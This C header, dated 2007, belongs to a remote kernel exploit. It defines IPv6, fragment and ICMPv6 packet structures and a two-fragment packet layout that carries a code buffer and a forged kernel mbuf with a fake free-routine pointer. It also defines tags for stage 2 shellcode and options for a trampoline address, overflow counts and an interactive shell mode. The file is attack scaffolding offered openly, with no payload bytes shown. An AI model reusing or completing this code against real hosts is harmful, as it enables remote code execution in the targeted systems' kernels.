/*
 *  Copyright (c) 2007 Claes M. Nyberg <cmn@signedness.org>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */


#ifndef _CMN_XPL_H
#define _CMN_XPL_H

#define HEAPBUF(pt, size)                              \
	if ( (pt = calloc(1, size)) == NULL) {             \
		err_errnox("Failed to allocate heap memory");  \
	}

/* Memory start/end tag for stage 2 shellcode 
 * Make sure to edit stage 1 shellcode if you 
 * edit these values */
#define MAGIC_START 0xbadc0ded
#define MAGIC_END 0xcafebabe

#include "print.h"
#include "net.h"

/*
 * Ethernet header
 */
typedef struct {
    uint8_t dest[6];
    uint8_t src[6];
    uint16_t proto;
} __attribute__((packed)) eth_hdr_t;


/*
 * Internet Protocol version 6 header.
 */
typedef struct {

    union {
		struct {
			/* 4 bits version, 8 bits traffic class, 20 bits flow-ID */
			uint32_t ip6_un1_flow;  
			uint16_t paylen; /* payload length */
			uint8_t  next;   /* next header */
			uint8_t  hops;   /* hop limit */
		} ctlx;

		/* 4 bits version, top 4 bits tclass */
		uint8_t ver_tc; 

	} ctl;

    uint8_t  src[16];	/* Source address */
    uint8_t  dst[16];	/* Destination address */
} __attribute__((packed)) ip6_hdr_t;

/* Hop-by-hop header */
typedef struct {
	uint8_t  next;     /* next header.  */
	uint8_t  len;      /* length in units of 8 octets.  */
} __attribute__((packed)) ip6_hbh_t;

/* Fragment header */
typedef struct {
    uint8_t   next;     /* next header */
    uint8_t   reserved; /* reserved field */
    uint16_t  offlg;    /* offset, reserved, and flag */
    uint32_t  ident;    /* identification */
} __attribute__((packed)) ip6_frag_t;


/*
 * ICMP v6 Header
 */
typedef struct {
    uint8_t     type;   /* type field */
    uint8_t     code;   /* code field */
    uint16_t    cksum;  /* checksum field */
    union {
        uint32_t  data32[1]; /* type-specific field */
        uint16_t  data16[2]; /* type-specific field */
        uint8_t   data8[4];  /* type-specific field */
    } data;
} __attribute__((packed)) icmp6_hdr_t;


struct pwrpkts {

	/* First fragment */
	struct firstfrag {
		eth_hdr_t eh;
		ip6_hdr_t ip6h;
		ip6_hbh_t hbh;
		#define HBHLEN 1
		#define HBHOPTLEN (((HBHLEN+1)*8)-2)
		uint8_t hbh_opts[HBHOPTLEN];
		ip6_frag_t fh;
		uint8_t data[150];
	} __attribute__((packed)) frag1;

	/* Second fragment */
	struct secondfrag {
		eth_hdr_t eh;
		ip6_hdr_t ip6h;
		ip6_frag_t fh;
		
		icmp6_hdr_t ic;
		uint8_t code[212];

		struct target_mbuf {
			/* m_hdr */
			uint32_t mh_next;       /* pointer to next buffer in chain */
			uint32_t mh_nextpkt;    /* pointer to next chain in queue/record */
			uint32_t mh_data;       /* location of data */
			uint32_t mh_len;        /* Amount of data in this mbuf */
			int16_t mh_type;        /* Type of data in this mbuf */
			uint16_t mh_flags;      /* flags */

			/* pkthdr */
			uint32_t rcv_interface; /* Pointer to struct  ifnet */
			uint32_t tags;          /* List head for packet tags */
			int32_t len;            /* Total packet length */
			int32_t csum_flags;     /* Checksum flags */

			/* m_ext */
			uint32_t ext_buf;       /* Start of buffer */
			uint32_t ext_free;      /* Free routine */
			uint32_t ext_arg;       /* arg pointer for ext_free */
			uint32_t ext_size;      /* Size of buffer,for ext_free */
			int32_t ext_type;
    
			uint32_t ext_nextref;   /* next pointer */
			uint32_t ext_prevref;   /* prev pointer */
		} next_mbuf;

	} __attribute__((packed)) frag2;
	
	/* Valid ICMP Packet */
	struct icmp6_pkt {
		eth_hdr_t eh;
		ip6_hdr_t ip6h;
		icmp6_hdr_t ic;
		uint8_t data[1232];
	} __attribute__((packed)) vic;
};

/* Commandline options */
struct options {
	unsigned int dry_run:1;
	unsigned int iact:1;
	unsigned int no_listen:1;
	unsigned int single_icmpv6:1;
	unsigned int force_break:1;

	uint32_t trampoline;
	uint16_t oflow_count;
	uint16_t mbuf_fill_count;
    char *device;
    uint8_t target_mac[6];

	/* Command flag in ICMPv6 data */
	uint32_t magic;
};

struct target {
	char *desc;
	uint32_t trampoline;
};

/* iact.c */
extern int iact(struct icmp6_pkt *, struct options *);

#endif /* _CMN_XPL_H */
